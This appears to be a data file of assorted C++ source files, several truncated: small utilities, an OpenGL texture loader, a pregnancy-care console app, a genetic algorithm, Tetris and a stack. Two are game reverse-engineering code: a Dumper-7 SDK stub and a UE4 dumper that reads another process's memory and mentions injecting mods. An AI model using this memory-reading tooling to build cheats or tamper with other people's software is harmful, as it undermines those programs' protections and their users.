    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// WidgetBlueprintGeneratedClass RebootVanIndicator.RebootVanIndicator_C\n// (None)\n\nclass UClass* URebootVanIndicator_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"RebootVanIndicator_C\");\n\n\treturn Clss;\n}\n\n\n// RebootVanIndicator_C RebootVanIndicator.Default__RebootVanIndicator_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass URebootVanIndicator_C* URebootVanIndicator_C::GetDefaultObj()\n{\n\tstatic class URebootVanIndicator_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<URebootVanIndicator_C*>(URebootVanIndicator_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function RebootVanIndicator.RebootVanIndicator_C.Construct\n// (BlueprintCosmetic, Event, Public, BlueprintEvent)\n// Parameters:\n\nvoid URebootVanIndicator_C::Construct()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"RebootVanIndicator_C\", \"Construct\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function RebootVanIndicator.RebootVanIndicator_C.ExecuteUbergraph_RebootVanIndicator\n// (Final, UbergraphFunction)\n// Parameters:\n// int32                              EntryPoint                                                       (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// class UUMGSequencePlayer*          CallFunc_PlayAnimation_ReturnValue                               (ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid URebootVanIndicator_C::ExecuteUbergraph_RebootVanIndicator(int32 EntryPoint, class UUMGSequencePlayer* CallFunc_PlayAnimation_ReturnValue)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"RebootVanIndicator_C\", \"ExecuteUbergraph_RebootVanIndicator\");\n\n\tParams::URebootVanIndicator_C_ExecuteUbergraph_RebootVanIndicator_Params Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\tParms.CallFunc_PlayAnimation_ReturnValue = CallFunc_PlayAnimation_ReturnValue;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n}\n\n}\n\n\n",
    "//\n// Created by Hypericats on 5/9/2024.\n//\n\n#include \"Util.h\"\n\n\n//for a future string version, str.find(std::basic_string, size_t size) exists\nstd::vector<std::string> Util::splitString(const std::string& str, const char& regex) {\n    std::vector<std::string> splits;\n    std::string strCopy = str;\n    int searchIndex;\n    int index = 0;\n    //Check that there is still another instance of the regex in the string\n    while (true) {\n        searchIndex = (int)strCopy.find(regex);\n        if (searchIndex == -1) break;\n        //Need to store in variable in order to call the constructor from Cstring to string\n        std::string out = strCopy.substr(0, searchIndex);\n        splits.push_back(out);\n        strCopy = strCopy.substr(searchIndex + 1);\n        index++;\n    }\n    splits.push_back(strCopy);\n    return splits;\n}\n\nint Util::indexOf(std::string str, std::vector<std::string> v) {\n    for (int i = 0; i < v.size(); i++) {\n        if (v.at(i) == str) return i;\n    }\n    return -1;\n}\n\n//uses endl because meant for debug not for prod\nvoid Util::printVec(std::vector<std::string> vec) {\n    for (std::string str : vec) {\n        std::cout << str << std::endl;\n    }\n}\n",
    "#include \"Texture.h\"\n#include \"CommonValues.h\"\n\n\nTexture::Texture()\n{\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = 0;\n}\nTexture::Texture(const char *FileLoc)\n{\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = FileLoc;\n}\n\nbool Texture::LoadTextureA()\n{\n\t//para cambiar el origen a la esquina inferior izquierda como necesitamos\n\tstbi_set_flip_vertically_on_load(true);\n\tunsigned char *texData = stbi_load(fileLocation, &width, &height, &bitDepth,STBI_rgb_alpha); //el tipo unsigned char es para un array de bytes de la imagen, obtener datos de la imagen \n\tif (!texData)\n\t{\n\t\tprintf(\"No se encontr\u00f3 el archivo: %s\", fileLocation);\n\t}\n\tglGenTextures(1, &textureID); //parecido al VAO: crear una textura y asignarle un \u00edndice\n\tglBindTexture(GL_TEXTURE_2D, textureID);//se indica que la textura es de tipo 2D, para superficies planas es suficiente esta textura\n\t\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);// eje S paralelo a X, repetir sobre el eje\n/*\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_MIRRORED_REPEAT);// eje S paralelo a X, repetir sobre el eje pero rotando con forme a un centro\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);// eje S paralelo a X, envolver toda la superficie\n*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);// eje T paralelo a Y, repetir sobre el eje\n\t/*GL_TEXTURE_MIN_FILTER: Para m\u00e1s cerca o textura se escala a menor tama\u00f1o. GL_TEXTURE_MAG_FILTER: Para m\u00e1s lejos o textura se escala a mayor tama\u00f1o. \n\tGL_LINEAR  aplica sampling y blending de texels m\u00e1s cercanos. GL_NEAREST aplica sample de texel m\u00e1s cercano\n\t*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t//glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\t//if(RGBA) {\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, texData);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\t/*}else{\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, texData)\n\tglGenerateMipmap(GL_TEXTURE_2D); */\n\tglBindTexture(GL_TEXTURE_2D, 0);//para hacer un unbind de la textura\n\tstbi_image_free(texData); //para liberar la informaci\u00f3n de la imagen\n\treturn true;\n}\nbool Texture::LoadTexture()\n{\n\t//para cambiar el origen a la esquina inferior izquierda como necesitamos\n\tstbi_set_flip_vertically_on_load(true);\n\tunsigned char *texData = stbi_load(fileLocation, &width, &height, &bitDepth, 0); //el tipo unsigned char es para un array de bytes de la imagen, obtener datos de la imagen \n\tif (!texData)\n\t{\n\t\tprintf(\"No se encontr\u00f3 el archivo: %s\", fileLocation);\n\t}\n\tglGenTextures(1, &textureID); //parecido al VAO: crear una textura y asignarle un \u00edndice\n\tglBindTexture(GL_TEXTURE_2D, textureID);//se indica que la textura es de tipo 2D, para superficies planas es suficiente esta textura\n\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);// eje S paralelo a X, repetir sobre el eje\n/*\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_MIRRORED_REPEAT);// eje S paralelo a X, repetir sobre el eje pero rotando con forme a un centro\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);// eje S paralelo a X, envolver toda la superficie\n*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);// eje T paralelo a Y, repetir sobre el eje\n\t/*GL_TEXTURE_MIN_FILTER: Para m\u00e1s cerca o textura se escala a menor tama\u00f1o. GL_TEXTURE_MAG_FILTER: Para m\u00e1s lejos o textura se escala a mayor tama\u00f1o.\n\tGL_LINEAR  aplica sampling y blending de texels m\u00e1s cercanos. GL_NEAREST aplica sample de texel m\u00e1s cercano\n\t*/\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t//glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, texData);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\tglGenerateMipmap(GL_TEXTURE_2D);\n\tglBindTexture(GL_TEXTURE_2D, 0);//para hacer un unbind de la textura\n\tstbi_image_free(texData); //para liberar la informaci\u00f3n de la imagen\n\treturn true;\n}\nvoid Texture::ClearTexture()\n{\n\n\tglDeleteTextures(1, &textureID);\n\ttextureID = 0;\n\twidth = 0;\n\theight = 0;\n\tbitDepth = 0;\n\tfileLocation = \"\";\n}\nvoid Texture::UseTexture()\n{\t//UnitTexture\n\tglActiveTexture(GL_TEXTURE0); //para crear un sampler que es lo que necesitan los shaders para poder acceder a la textura: 16 a 32 texturas pueden ser declaradas\n\t//si hay mas de 1 unittexture se tiene que crear una unifromvariable que haga cambio entre la unit texture a utilizar\n\tglBindTexture(GL_TEXTURE_2D, textureID);\n\n}\n\nTexture::~Texture()\n{\n\tClearTexture();\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct DietPlan \n{\n    std::string description;\n};\n\n\nstruct ExercisePlan \n{\n    std::string description;\n};\n\nstruct Doctor \n{\n    std::string name;\n    std::string contactNumber;\n};\n\nstruct Patient \n{\n    std::string name;\n    std::string enrollmentDate;\n    std::string contactNumber;\n    std::string disease;\n    std::string pregnancyWeeks;\n    std::string height;\n    std::string weight;\n    Doctor attendingDoctor;\n};\n\nstruct EmergencyContacts\n{\n\tstd::string name;\n\tstd::string contactNumber;\n};\n\nvoid displayDoctors(const std::vector<Doctor>& doctors);\nvoid bookAppointment(const Doctor& doctor);\nvoid viewPatientInfo(const std::vector<Patient>& patients);\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\nvoid viewDietPlanForPregnancy();\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\n\nint main() \n{\n    std::vector<Doctor> nearbyDoctors;\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\n\n\n    std::vector<Patient> patients;\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\n\n    std::vector<EmergencyContacts> contacts;\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\n    \n    \n    int choice;\n    int patientChoice;\n\n    do {\n        std::cout <<endl<< \"1. View patient information\\n\";\n        std::cout << \"2. View diet plan for pregnancy\\n\";\n        std::cout << \"3. View exercise plan\\n\";\n        std::cout << \"4. View nearby doctors\\n\";\n        std::cout << \"5. Book an appointment\\n\";\n        std::cout << \"6. View emergency contact numbers\\n\";\n        std::cout << \"7. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) \n\t\t{\n            case 1:\n                viewPatientInfo(patients);\n                break;\n            case 2:\n                viewDietPlanForPregnancy();\n                break;\n            case 3:\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day ",
    "#include <iostream>\n#include <string>\n#include <random>\n#include <array>\nusing namespace std;\n\n\n//----------------------------- configuration --------------------------------\n\nconst int init_population = 100;\nconst int repeat = 10;\nconst float mutation_rate = 0.5;\n\n//----------------------------------------------------------------------------\n//---------------------------- number generator ------------------------------\n\nint randomnum () {\n    random_device r;\n    uniform_int_distribution<int> number(0,9);\n    return number(r);\n}\n\n//----------------------------------------------------------------------------\n//---------------------------- fintness function -----------------------------\n\nvoid evaluate (int(&numbers)[init_population][5], int target[4]) {   \n    for (int i=0 ; i<init_population ; i++) {\n        \n        int counter = 0;\n \n        for (int j=0 ; j<4 ; j++){           \n            if (numbers[i][j] == target [j]) {\n                counter ++;\n            }\n            numbers[i][4] = counter;\n        }\n    }\n}\n\n//----------------------------------------------------------------------------\n//--------------------------------- sort -------------------------------------\n\nvoid sort(int(&numbers)[init_population][5]) {\n    for(int i=0 ; i<init_population ; i++) {\n\n        int maxvalue[2] = {i, numbers[i][4]};\n        \n        for(int j=i ; j<init_population ; j++) {\n            if(numbers[j][4] > maxvalue[1]) {\n                maxvalue[0] = j; maxvalue[1] = numbers[j][4];\n            }\n        }\n        \n        int tempnum[5];\n\n        for(int j=0 ; j<5 ; j++) {\n            tempnum[j] = numbers[i][j];\n        }\n        for(int j=0 ; j<5 ; j++) {\n            numbers[i][j] = numbers[maxvalue[0]][j];\n        }\n        for(int j=0 ; j<5 ; j++) {\n            numbers[maxvalue[0]][j] = tempnum[j];\n        }\n    }\n}\n\n//----------------------------------------------------------------------------\n//------------------------------ cross over ----------------------------------\n\nvoid cross_over(int(&numbers)[init_population][5]){\n    for (int i=0 ; i<init_population/2 ; i+=2){\n\n        numbers[i + (init_population/2)][0] = numbers[i][0];\n        numbers[i + (init_population/2)][1] = numbers[i][1];\n        numbers[i + (init_population/2)][2] = numbers[i+1][2];\n        numbers[i + (init_population/2)][3] = numbers[i+1][3];\n        \n        numbers[i + (init_population/2) +1][0] = numbers[i+1][0];\n        numbers[i + (init_population/2) + 1][1] = numbers[i+1][1];\n        numbers[i + (init_population/2) + 1][2] = numbers[i][2];\n        numbers[i + (init_population/2) + 1][3] = numbers[i][3];      \n    }\n}\n\n//----------------------------------------------------------------------------\n//-------------------------------- print -------------------------------------\n\nvoid print(int(&numbers)[init_population][5]) {\n    for (int i =0 ; i<init_population ; i++) {\n        for (int j =0 ; j<5 ; j++){\n            cout << numbers[i][j];\n        }   \n        cout << endl;\n    } \n}\n\n//----------------------------------------------------------------------------\n//------------------------------- Mutation -----------------------------------\n\nvoid mutation(int(&numbers)[init_population][5]){    \n    for(int i=0 ; i< int(init_population * mutation_rate) ; i++) {\n        numbers[randomnum()][randomnum()] = randomnum();\n    }\n}\n\n//----------------------------------------------------------------------------\n//-------------------------------- M A I N -----------------------------------\n//----------------------------------------------------------------------------\n\nint main() {\n\n    //setting the target\n    int target[4];\n    cout << \"enter a 4-digit number: \";                          \n    for(int i=0 ; i<4 ; i++){\n        cin >> target[i];\n    }\n\n    //creating our initial population\n    int numbers[init_population][5];\n    for(int i=0;i<init_population;i++) {         \n        for(int j=0;j<4;j++) {\n            numbers[i][j] = randomnum();\n        }\n    }\n    int generation = 0;\n\n    \n    for(int rpt=0 ; rpt < repeat ; rpt++) {\n\n        //evaluating and sorting the result\n        evaluate(numbers, target);\n        sort(numbers);\n\n        //checking for the target\n        if(numbers[0][4] == 4) {\n            cout << \"target was found in generation \" << generation;\n            break;\n\n        } else {\n            cout << \"best case found in generation \" << generation << \" is : \" ;\n            for (int i=0 ; i<4 ; i++) {\n                cout << numbers[0][i];\n            }\n            cout << endl;\n\n            //creating the next generation\n            cross_over(numbers);\n            mutation(numbers);\n            generation++;\n        }       \n    }   \n    return 0;\n}\n",
    "#include <conio.h> // for _kbhit and _getch\r\n#include <Windows.h> // for sleep \r\n#include \"game.h\"\r\n#include <iostream>\r\n#include \"general.h\"\r\n\r\n\r\nint main()\r\n{\r\n    //TETRIS opening logo\r\n    std::cout << \" /$$$$$$$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$  /$$$$$$  /$$$$$$ \" << std::endl;\r\n    std::cout << \"|__  $$__/| $$_____/|__  $$__/| $$__  $$|_  $$_/ /$$__  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$  | $$  \\\\__/\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$      | $$   | $$$$$$$/  | $$  |  $$$$$$ \" << std::endl;\r\n    std::cout << \"   | $$   | $$__/      | $$   | $$__  $$  | $$   \\\\____  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$   /$$  \\\\ $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$$$$   | $$   | $$  | $$ /$$$$$$|  $$$$$$/\" << std::endl;\r\n    std::cout << \"   |__/   |________/   |__/   |__/  |__/|______/ \\\\______/ \" << std::endl;\r\n\r\n    Sleep(1500);\r\n    clear_screen();\r\n\r\n   \r\n\tGame newGame;  \r\n    //game status returns true when the player want to quit the game\r\n    while (!newGame.getGameStatus()) \r\n    { \r\n\t    newGame.menu((int)gameOption::STARTGAME);\r\n    }\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include <Windows.h>\n#include <fmt/core.h>\n#include \"dumper.h\"\n#include \"engine.h\"\n#include \"memory.h\"\n#include \"utils.h\"\n#include \"wrappers.h\"\n\nDumper::~Dumper() {\n  if (Image) VirtualFree(Image, 0, MEM_RELEASE);\n}\n\nSTATUS Dumper::Init(int argc, char *argv[]) {\n  for (auto i = 1; i < argc; i++) {\n    auto arg = argv[i];\n    uint16 arg16 = *(uint16*)arg;\n    if (arg16 == 'h-') {\n      printf(\"'-p' - dump only names and objects\\n'-w' - wait for input (it gives me time to inject mods)\\n'-f packageNameHere' - specifies package where we should look for pointers in paddings (can take a lot of time)\");\n      return STATUS::FAILED;\n    } else if (arg16 == 'p-') {\n      Full = false;\n    } else if (arg16 == 'w-') {\n      Wait = true;\n    } else if (arg16 == 'f-') {\n      i++;\n      if (i < argc) {  PackageName = argv[i]; }\n      else { return STATUS::FAILED; }\n    }\n    else if (!strcmp(arg, \"--spacing\")) {\n      Spacing = true;\n    }\n  }\n\n  if (Wait) {\n    system(\"pause\");\n  }\n\n  uint32_t pid = 0;\n\n  {\n    HWND hWnd = FindWindowA(\"UnrealWindow\", nullptr);\n    if (!hWnd) {\n      return STATUS::WINDOW_NOT_FOUND;\n    };\n    GetWindowThreadProcessId(hWnd, (DWORD*)(&pid));\n    if (!pid) {\n      return STATUS::PROCESS_NOT_FOUND;\n    };\n  }\n\n  if (!ReaderInit(pid)) {\n    return STATUS::READER_ERROR;\n  };\n\n  fs::path processName;\n\n  {\n    wchar_t processPath[MAX_PATH]{};\n    if (!GetProccessPath(pid, processPath, MAX_PATH)) { return STATUS::CANNOT_GET_PROCNAME; };\n    processName = fs::path(processPath).filename();\n    printf(\"Found UE4 game: %ls\\n\", processName.c_str());\n  }\n\n  {\n    auto root = fs::path(argv[0]);\n    root.remove_filename();\n    auto game = processName.stem();\n    Directory = root / \"Games\" / game;\n    fs::create_directories(Directory);\n\n    uint64 size = GetImageSize();\n    if (!size) { return STATUS::MODULE_NOT_FOUND; }\n    \n    Image = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!Read((void*)Base, Image, size)) {\n      return STATUS::CANNOT_READ;\n    }\n\n    return EngineInit(game.string(), Image);\n  }\n}\n\nSTATUS Dumper::Dump() {\n  /*\n   * Names dumping.\n   * We go through each block, except last, that is not fully filled.\n   * In each block we calculate next entry depending on previous entry size.\n   */\n  {\n    File file(Directory / \"NamesDump.txt\", \"w\");\n    if (!file) { return STATUS::FILE_NOT_OPEN; }\n    size_t size = 0;\n    NamePoolData.Dump([&file, &size](std::string_view name, uint32_t id) {\n      fmt::print(file, \"[{:0>6}] {}\\n\", id, name);\n      size++;\n    });\n    fmt::print(\"Names: {}\\n\", size);\n  }\n  {\n    // Why we need to iterate all objects twice? We dumping objects and filling\n    // packages simultaneously.\n    std::unordered_map<uint8*, std::vector<UE_UObject>> packages;\n    {\n      File file(Directory / \"ObjectsDump.txt\", \"w\");\n      if (!file) { return STATUS::FILE_NOT_OPEN; }\n      size_t size = 0;\n\n\n      std::function<void(UE_UObject)> callback;\n      if (Full) {\n        callback = [&file, &size, &packages](UE_UObject object) {\n\n          auto isFunction = object.IsA<UE_UFunction>();\n          if (isFunction) {\n            fmt::print(file, \"[{:0>6}] <{}> <{}> {} {:x}\\n\", object.GetIndex(), object.GetAddress(), Read<void*>(object.GetAddress()), object.GetFullName(), object.Cast<UE_UFunction>().GetFunc() - Base);\n          }\n          else {\n            fmt::print(file, \"[{:0>6}] <{}> <{}> {}\\n\", object.GetIndex(), object.GetAddress(), Read<void*>(object.GetAddress()), object.GetFullName());\n          }\n          size++;\n          if (isFunction || object.IsA<UE_UStruct>() || object.IsA<UE_UEnum>()) {\n            auto packageObj = object.GetPackageObject();\n            packages[packageObj].push_back(object);\n          }\n        };\n      }\n      else {\n        callback = [&file, &size](UE_UObject object){\n          fmt::print(file, \"[{:0>6}] <{}> <{}> {}\\n\", object.GetIndex(), object.GetAddress(), Read<void*>(object.GetAddress()), object.GetFullName());\n          size++;\n        };\n      }\n\n      ObjObjects.Dump(callback);\n\n      fmt::print(\"Objects: {}\\n\", size);\n    }\n\n    if (!Full) {\n      return STATUS::SUCCESS;\n    }\n\n    //{\n    //    // Clearing all packages with small amount of objects (comment this if\n    //    you need all packages to be dumped) size_t size = packages.size();\n    //    size_t erased = std::erase_if(packages, [](std::pair<byte* const,\n    //    std::vector<UE_UObject>>& package) { return package.second.size() < 2;\n    //    });\n\n    //    fmt::print(\"Wiped {} out of {}\\n\", erased, size);\n    //}\n\n    // Checking if we have any package after clearing.\n    if (!packages.size()) {\n      return STATUS::ZERO_PACKAGES;\n    }\n\n    fmt::print(\"Packages: {}\\n\", packages.size());\n\n    {\n      auto path = Directory / \"DUMP\";\n      fs::create_directories(path);\n\n      int i = 1;\n      int saved = 0;\n      std::string unsaved{};\n\n      bool lock = true;\n      if (PackageName) lock = false;\n\n      for (UE_UPackage package : packages) {\n        fmt:",
    "\ufeff#include \"CCauThu.h\"\r\nvoid CDate::Input(const string& date) {\r\n\tstringstream ss(date);\r\n\tchar delimiter;\r\n\tss >> m_Day >> delimiter >> m_Month >> delimiter >> m_Year;\r\n}\r\nvoid CDate::Output(ofstream& outFile) const {\r\n\toutFile << setfill('0') << setw(2) << m_Day << \"/\"\r\n\t\t<< setw(2) << m_Month << \"/\" << m_Year;\r\n}\r\nCDate::CDate(int year, int month, int day) : m_Year(year), m_Month(month), m_Day(day) {}\r\nCDate CDate::getFullDate() const {\r\n\treturn CDate(m_Day, m_Month, m_Year);\r\n}\r\nbool CDate::operator<(const CDate& other) const {\r\n\tif (m_Year != other.m_Year) {\r\n\t\treturn m_Year < other.m_Year;\r\n\t}\r\n\tif (m_Month != other.m_Month) {\r\n\t\treturn m_Month < other.m_Month;\r\n\t}\r\n\treturn m_Day < other.m_Day;\r\n}\r\nCDate CCauThu::getFullDate() const {\r\n\treturn m_DOB.getFullDate();\r\n}\r\n\r\nvoid CCauThu::Input(ifstream& inFile) {\r\n\tstring input; getline(inFile, input);\r\n\tstd::stringstream ss(input);\r\n\tstd::string token;\r\n\tstd::vector<std::string> tokens;\r\n\r\n\twhile (std::getline(ss, token, '-')) {\r\n\t\ttoken.erase(0, token.find_first_not_of(\" \"));\r\n\t\ttoken.erase(token.find_last_not_of(\" \") + 1);\r\n\t\ttokens.push_back(token);\r\n\t}\r\n\tm_Name = tokens[0];\r\n\tm_Position = tokens[1];\r\n\tm_DOB.Input(tokens[2]);\r\n\tm_SquadNumber = stoi(tokens[3]);\r\n}\r\nvoid CCauThu::Output(ofstream& outFile) {\r\n\toutFile << m_Name << \" - \" << m_Position << \" - \"; m_DOB.Output(outFile);\r\n\toutFile << \" - \" << m_SquadNumber;\r\n}",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\n// global pointer\nnode* TOP = NULL;\nnode* current = NULL;\n\nbool isEmpty()\n{\n\tif (TOP == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (!isEmpty())\n\t{\n\t\tcurrent->next = TOP;\n\t\tTOP = current;\n\t}\n\telse\n\t{\n\t\tTOP = current;\n\t\tTOP->next = NULL;\n\t}\n}\nvoid pop()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n\telse\n\t\tcout << \"No stack found\" << endl;\n}\nvoid popAll()\n{\n\twhile (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n}\nvoid display()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse cout << \"There is no data in the Stack\\n\";\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\tp -> push node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\t\tint op, c, p, ao, s;\n\tcout << \"--- Welcome to stack implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Push -> (1)\\n\";\n\t\tcout << \"Pop an Elements -> (2) \\n\";\n\t\tcout << \"POP All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to push \\n\";\n\t\t\tcin >> p;\n\t\t\tpush(p);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to pop one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpop();\n\t\t\t\tcout << \"\\nCheck data of stack after poping first node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to pop all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpopAll ();\n\t\t\t\tcout << \"\\nCheck data of stack after poping all nodes : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 